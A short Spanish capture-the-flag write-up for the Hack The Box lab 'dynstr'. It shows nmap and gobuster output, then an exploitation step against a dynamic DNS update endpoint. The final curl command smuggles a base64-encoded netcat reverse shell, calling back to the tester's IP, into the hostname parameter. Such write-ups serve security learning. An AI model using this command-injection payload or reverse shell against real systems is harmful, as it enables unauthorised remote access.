# dynstr

## Reconocimiento 

¨¨¨
# Nmap 7.92 scan initiated Sun Jun 12 15:38:52 2022 as: nmap -p- --min-rate=1000 -sS -v -n -oN nmap.init 10.10.10.244
Nmap scan report for 10.10.10.244
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jun 12 15:40:04 2022 -- 1 IP address (1 host up) scanned in 72.41 seconds
¨¨¨
## Enumeración web 


¨¨¨bash
gobuster dir -u http://10.10.10.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster.root.medium
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/13 21:13:00 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.244/assets/]
/nic                  (Status: 301) [Size: 310] [--> http://10.10.10.244/nic/]   
¨¨¨
Esta el directorio nic asi que vamos a inspeccionarlos detalladamente.


¨¨¨bash
gobuster dir -u http://10.10.10.244/nic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster.root.medium.nic
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244/nic
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/13 21:14:13 Starting gobuster in directory enumeration mode
===============================================================
/update               (Status: 200) [Size: 8]
¨¨¨

Se encontro la ruta /nic/update

Despues de googlear se encontro que el end point era de un servicio DNS.

#### Explotación
Se tenia que hacer con el payload **encodeUrl($(encodeB64(revshell)))** 

El payload es el siguiente:

    curl "http://dynadns:sndanyd@10.10.10.244/nic/update?myip=127.0.0.1&hostname=%24%28echo%20%22cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTAuMTAuMTYuMiAyOTE1MSA%2BL3RtcC9mCg%3D%3D%22%7Cbase64%20-d%7Cbash%29.dynamicdns.htb&username=dynadns&password=sndanyd"








